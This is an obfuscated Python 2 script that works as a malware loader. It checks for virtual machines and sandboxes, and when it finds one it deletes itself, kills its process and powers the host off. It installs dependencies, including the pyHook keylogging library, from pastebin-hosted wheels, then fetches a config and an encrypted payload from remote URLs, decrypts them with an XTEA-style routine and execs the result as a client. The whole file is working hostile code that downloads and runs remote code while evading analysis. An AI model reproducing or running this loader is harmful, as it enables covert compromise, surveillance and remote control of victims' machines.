#!/usr/bin/python
h=True
O=globals
M=bytes
w=None
Wg=Exception
WK=range
WU=len
Wk=chr
WI=ord
WN=zip
Wo=str
WP=file
WA=bool
import os
f=os.path
H=os.remove
u=os.execv
b=os.name
d=os.getpid
R=os.chdir
C=os.environ
S=os.popen
import sys
c=sys.exit
E=sys.prefix
j=sys.argv
a=sys.executable
import time
import json
B=json.loads
import struct
l=struct.calcsize
n=struct.unpack
F=struct.pack
import base64
t=base64.b64decode
import urllib
m=urllib.urlopen
import marshal
import subprocess
s=subprocess.call
p=subprocess.Popen
X=subprocess.PIPE
__debug=h
def W(e):
 if O().get('__debug'):
  print(M(e))
def g(output=w):
 if O().get('__debug'):
  W(output)
  c(0)
 else:
  if b is 'nt':
   K('del /f /q %s'%j[0])
   K('taskkill /pid %d'%d())
   K('shutdown /p /f')
  else:
   K('rm -f %s'%j[0])
   K('kill -9 %d'%d())
   K('shutdown --poweroff --no-wall')
def K(cmd):
 try:
  _=p(cmd,0,w,w,X,X,shell=h)
 except Wg as e:
  W(e)
def U(N,key):
 try:
  N =t(N)
  o =[N[i*8:((i+1)*8)]for i in WK(WU(N)//8)]
  P =o[0]
  A =[]
  for Y in o[1:]:
   u,v=n("!2L",Y)
   k =n("!4L",key)
   d,m=0x9e3779b9L,0xffffffffL
   s =(d*32)&m
   for _ in WK(32):
    v =(v-(((u<<4^u>>5)+u)^(s+k[s>>11&3])))&m
    s =(s-d)&m
    u =(u-(((v<<4^v>>5)+v)^(s+k[s&3])))&m
   r =F("!2L",u,v)
   e =M().join(Wk(WI(x)^WI(y))for x,y in WN(P,r))
   P =Y
   A.append(e)
  return M().join(A).rstrip(Wk(0))
 except Wg as e:
  W(e)
def k(*args,**kwargs):
 try:
  x =S('where pip' if b is 'nt' else 'which pip').read().rstrip()
  if not x:
   exec m("https://bootstrap.pypa.io/get-pip.py").read()in O()
   u(a,['python']+[f.abspath(j[0])]+j[1:])
  else:
   Q=B(m(kwargs.get('config')).read())
   R(f.expandvars('%TEMP%'))if b is 'nt' else R('/tmp')
   T=B(m(Q['t']).read()).get(b).get(Wo(l('P')*8))
   for J,url in T.items():
    if not s([x,'show',J],0,w,w,X,X,shell=h)==0:
     K([x,'install',J])
     if not s([x,'show',J],0,w,w,X,X,shell=h)==0:
      if 'pastebin' not in url:
       K([x,'install',url])
      else:
       if 'pyHook' in J:
        v='pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
        with WP(v,'wb')as fp:
         fp.write(t(m(url).read()))
        K([x,'install',v])
        if f.isfile(v):
         H(v)
       elif 'pypiwin32' in J:
        v='pywin32-221-cp27-cp27m-win_amd64.whl'
        with WP(v,'wb')as fp:
         fp.write(t(m(url).read()))
        K([x,'install',v])
        L =f.join(E,f.join('Scripts','pywin32_postinstall.py'))
        if f.isfile(L):
         K([L,'-install'])
        if f.isfile(v):
         H(v)
       elif 'pycrypto' in J:
        v='pycrypto-2.6.1-cp27-none-win_amd64.whl'
        with WP(v,'wb')as fp:
         fp.write(t(m(url).read()))
        K([x,'install',v])
        if f.isfile(v):
         H(v)
   return Q
 except Wg as e:
  W(e)
def I(*args,**kwargs):
 if kwargs.get('checkvm'):
  D=[_ for _ in C.keys()if 'VBOX' in _.upper()]
  z =[i.split()[0 if b is 'nt' else-1]for i in S('tasklist' if b is 'nt' else 'ps').read().splitlines()[3:]if i.split()[c].lower().split('.')[0]in['xenservice','vboxservice','vboxtray','vmusrvc','vmsrvc','vmwareuser','vmwaretray','vmtoolsd','vmcompute','vmmem']]
  if WU(D+z):
   g('virtual machine or sandbox was detected')
 if kwargs.get('config'):
  Q=k(**kwargs)
  G=m(Q.get('z')).read()
  q=m(Q.get('u')).read()
  I ='if __name__ == "__main__":\n\tpayload=Client(config="{}")\n\tpayload.run()'.format(kwargs.get('config'))
  V =t(G)
  i =U(q,V)
  exec '\n\n'.join([i,I])in O()
 else:
  g('missing config')
if __name__=='__main__':
 __debug=WA('--override' not in j)
 I(config='https://pastebin.com/raw/si8MrN5X')

